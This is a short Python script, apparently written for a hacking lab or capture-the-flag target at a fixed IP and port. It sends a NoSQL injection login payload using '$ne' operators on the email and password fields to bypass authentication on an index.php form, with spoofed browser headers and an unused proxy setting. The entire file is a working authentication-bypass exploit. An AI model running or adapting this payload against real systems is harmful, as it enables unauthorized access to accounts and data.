import requests
import urllib

def send_login_request(url, email, password):
    # Define the payload
    payload = {
        'email[$ne]': email,
        'password[$ne]': password
    }

    proxies = {
    'http': 'http://127.0.0.1:8080',  # Replace with your proxy's address
    'https': 'http://127.0.0.1:8080',  # Replace with your proxy's address
}
    encoded_data = urllib.parse.urlencode(payload)
    
    # Define the headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://94.237.50.92:42279',
        'Connection': 'keep-alive',
        'Referer': 'http://94.237.50.92:42279/',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i'
    }

    # Send the POST request
    response = requests.post(url, data=payload, headers=headers)

    # Print the response
    print('Status Code:', response.status_code)
    print('Response Body:', response.text)

# Use the function
url = "http://94.237.50.92:42279/index.php"
email = "test@test.com"  # Replace with the actual username
password = "[$ne]"  # Replace with the actual password

send_login_request(url, email, password)